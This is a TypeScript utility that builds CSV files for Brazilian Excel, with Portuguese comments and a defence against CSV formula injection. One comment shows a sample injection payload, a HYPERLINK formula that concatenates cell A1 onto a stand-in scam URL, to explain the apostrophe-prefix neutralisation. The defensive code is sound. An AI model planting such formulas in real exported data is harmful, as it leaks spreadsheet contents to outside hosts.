// Planilha pro Excel em português: separador ";" (o Excel do Brasil usa a
// vírgula como decimal), número com vírgula decimal e BOM UTF-8 pra os
// acentos abrirem certo ao dar dois cliques no arquivo.
//
// "Formula injection": sem neutralizeFormula, alguém cria um anúncio com
// título tipo `=HYPERLINK("http://golpe"&A1)` e, quando o admin abre o CSV
// no Excel/Sheets, a fórmula roda. Prefixar com "'" neutraliza sem mudar o
// que aparece na célula (Excel esconde o apóstrofo inicial).
export function neutralizeFormula(text: string): string {
  return /^[=+\-@\t\r]/.test(text) ? `'${text}` : text;
}

function cell(value: string | number): string {
  const text = typeof value === "number" ? value.toFixed(2).replace(".", ",") : neutralizeFormula(value);
  return /[";\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
}

export function toCsv(header: string[], rows: (string | number)[][]): string {
  return "﻿" + [header, ...rows].map((row) => row.map(cell).join(";")).join("\r\n") + "\r\n";
}

export function dateBr(iso: string): string {
  return iso ? new Date(iso).toLocaleDateString("pt-BR", { timeZone: "America/Sao_Paulo" }) : "";
}
